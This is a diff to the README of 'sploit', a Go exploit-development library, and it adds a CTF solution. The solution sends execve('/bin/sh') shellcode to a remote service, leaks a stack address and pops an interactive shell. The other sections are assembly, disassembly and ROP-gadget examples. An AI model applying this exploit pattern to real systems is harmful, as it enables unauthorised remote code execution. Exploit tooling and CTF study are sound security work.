@@ -1,17 +1,54 @@
 # sploit [![Build Status](https://travis-ci.org/zznop/sploit.svg?branch=master)](https://travis-ci.org/zznop/sploit)
 
-## Description
-
 Sploit is a Go package that aids in binary analysis and exploitation. The motivating factor behind the development of
 sploit is to be able to have a well designed API with functionality that rivals some of the more common Python exploit
 development frameworks while taking advantage of the Go programming language. Excellent cross-compiler support,
 goroutines, powerful crypto libraries, and static typing are just a few of the reasons for choosing Go.
 
 This project is inspired by pwntools and other awesome projects. It is still early in development. Expect for this
-project to be focused heavily on shellcoding, binary patching, ROP stack construction, and general binary analysis. It
-will focus less heavily on socket communication and server/client development.
+project to be focused heavily on shellcoding, binary patching, ROP stack construction, and general binary analysis.
 
-#### Example 1 - Compiling assembly code to bytes
+#### Solution for a CTF Challenge
+
+```go
+package main;
+
+import(
+    sp "github.com/zznop/sploit"
+)
+
+var arch = &sp.Processor {
+    Architecture: sp.ArchI386,
+    Endian: sp.LittleEndian,
+}
+
+var scInstrs = `mov al, 0xb   /* __NR_execve */
+                sub esp, 0x30 /* Get pointer to /bin/sh (see below) */
+                mov ebx, esp  /* filename (/bin/sh) */
+                xor ecx, ecx  /* argv (NULL) */
+                xor edx, edx  /* envp (NULL) */
+                int 0x80`
+
+func main() {
+    shellcode, _ := sp.Asm(arch, scInstrs)
+    r, _ := sp.NewRemote("tcp", "some.pwnable.on.the.interwebz:10800")
+    defer r.Close()
+    r.RecvUntil([]byte("HELLO:"), true)
+
+    // Leak a stack address
+    r.Send(append([]byte("/bin/sh\x00AAAAAAAAAAAA"), sp.PackUint32LE(0x08048087)...))
+    resp, _ := r.RecvN(20)
+    leakAddr := sp.UnpackUint32LE(resp[0:4])
+
+    // Pop a shell
+    junk := make([]byte, 20-len(shellcode))
+    junk = append(junk, sp.PackUint32LE(leakAddr-4)...)
+    r.Send(append(shellcode, junk...))
+    r.Interactive()
+}
+```
+
+#### Compiling Assembly to Machine Code
 
 ```go
 package main;
@@ -47,7 +84,7 @@ Opcode bytes:
 00000010  48 83 ec 08 48 89 44 24  28                       |H...H.D$(|
 ```
 
-#### Example 2 - Disassembling code in an ELF executable
+#### Disassembling Code in an ELF Executable
 
 ```go
 package main;
@@ -84,7 +121,7 @@ Disassembling 34 bytes at vaddr:00001135
 00001156: ret
 ```
 
-#### Example 3 - Query ROP gadgets and display those with a sub-string match against "pop rbp"
+#### Querying and Filtering ROP Gadgets
 
 ```go
 package main;
